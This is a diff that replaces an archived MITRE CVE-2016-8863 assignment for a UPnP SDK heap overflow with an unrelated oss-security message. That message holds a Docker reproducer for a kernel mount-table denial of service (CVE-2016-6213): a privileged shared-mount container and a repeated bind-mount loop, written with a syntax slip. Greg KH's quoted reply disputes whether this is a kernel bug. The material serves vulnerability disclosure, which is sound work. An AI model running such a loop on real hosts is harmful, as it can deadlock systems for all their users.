@@ -1,55 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/20/6
-Message-Id: <20161020162715.3B981B2E004@smtpvbsrv1.mitre.org>
-Date: Thu, 20 Oct 2016 12:27:15 -0400 (EDT)
-From: cve-assign@...re.org
-To: scott.tenaglia@...incea.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request - Portable UPnP SDK 1.6.19 through 1.8.x
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/14/2
+Message-ID: <1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>
+Date: Thu, 14 Jul 2016 12:15:02 -0400 (EDT)
+From: CAI Qian <caiqian@...hat.com>
+To: Greg KH <greg@...ah.com>
+Cc: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: Re: Re: cve request: local DoS by overflowing kernel mount table using shared bind mount
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Maybe this is a better reproducer using docker. It is exploitable even with
+user namespace enabled.
 
-> https://sourceforge.net/p/pupnp/bugs/133/
+# docker run -it -v /mnt/:/mnt/:shared --cap-add=SYS_ADMIN rhel7 /bin/bash
 
->   parse_uri( &out->URLs[i + 1], URLS->size - i + 1,
->              &out->parsedURLs[URLcount] )
+# cat /proc/self/uid_map 
+         0        995      65536
 
-This seems to be a CWE-372 ("Incomplete Internal State Distinction")
-issue in which the code expected to be in a state where it was
-operating on a set of validated URIs from a CALLBACK header, but
-actually was in a state where it was operating on a set of all URIs
-from a CALLBACK header. A validation step occurs for every URI, and
-the amount of memory allocated is correct for the set of validated
-URIs, but there is simply no data model for the set of validated URIs.
-(Conceivably, the set of validated URIs could be in its own array, or
-each URI in the original array could have a flag indicating whether it
-was valid.)
+# cat /proc/self/gid_map 
+         0        992      65536
 
-Use CVE-2016-8863.
+(insider container) # for i in `seq 1 20`; mount -o bind /mnt/1 /mnt/2; done
+   CAI Qian
 
-As mentioned, this has a resultant heap buffer overflow.
-
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCAAGBQJYCO/sAAoJEHb/MwWLVhi2WxMP/iE4erxSoRjKIE42RHEoeGq2
-UDy+y+B9Sf/xK0zWtZGB06Mmkli+v7SLKOkWK7oWHJ4tQa4NXCvKbzwfLbyX3jDZ
-Ul7IE42LFCti/bJqb1qQwqjM/LzMtOSloofBI5pMocYkBKnjaLq1PwRGDTKzyVEN
-7Hs8LhzkUsqDdr4z5bk1NhDNhBHDg+4pIJ91rFrqkL06bWIsUAnfUJmWE7wWGWGp
-XePAkR+yOkvOpsgdWPFmaUNU3t7iPkRhw/P24O8QG+So39z5DVts4IHYoOQHmIa5
-OtNKauWUxLMIOkUneZbWEazLrrglKGoG0VJzqXpNDAXciRPd6DNQ3GueJjthBkoG
-LrfsoTdUrpGA+q33DipHxg2Aj+OaN/LUQ1n+mYE09k3Iy+4OHN7xZ9VWUWirYkDL
-/JODFta8VX3BsMGFjUwNsICaxJm/kARxY72A7mKvJsEZ6Jow4seIIgzmFiBPqzPC
-ErcnxLIvbJOiy9jw0hP3qGH5I/5N1h+7ViUqS97mOy4MySgVs1kKtU+ZVpL4h1PK
-7smULHLCAKKLqpJS8smcd08ZmetYtB4s3ccPM0Yn7vQKRI92mCRgTpJh5IhqSmiZ
-IoesKUf10Ml+xx/DR5WEEZ4ACHn+Q7nUzMhobzHWQbG0NdXzUWXdWZQdkmS2NBfH
-1shVmylDTkJ5tLBQwHmM
-=WKq1
------END PGP SIGNATURE-----
+----- Original Message -----
+> From: "Greg KH" <greg@...ah.com>
+> To: oss-security@...ts.openwall.com
+> Cc: caiqian@...hat.com, cve-assign@...re.org
+> Sent: Wednesday, July 13, 2016 6:45:00 PM
+> Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount
+> 
+> On Wed, Jul 13, 2016 at 12:59:40PM -0400, cve-assign@...re.org wrote:
+> > > It was reported that the mount table expands by a power-of-two
+> > > with each bind mount command.
+> > 
+> > > If the system is configured in the way that a non-root user
+> > > allows bind mount even if with limit number of bind mount
+> > > allowed, a non-root user could cause a local DoS by quickly
+> > > overflow the mount table.
+> > 
+> > > it will cause a deadlock for the whole system,
+> > 
+> > >> form of unlimited memory consumption that is causing the problem
+> > 
+> > Use CVE-2016-6213.
+> 
+> A CVE for an "improperly configured system"?  Huh?  What distro has such
+> a configuration set by default?  This isn't a kernel bug, so what is
+> this CVE classified as being "against"?  It better not be against the
+> Linux kernel...
+> 
+> confused,
+> 
+> greg k-h
+> 
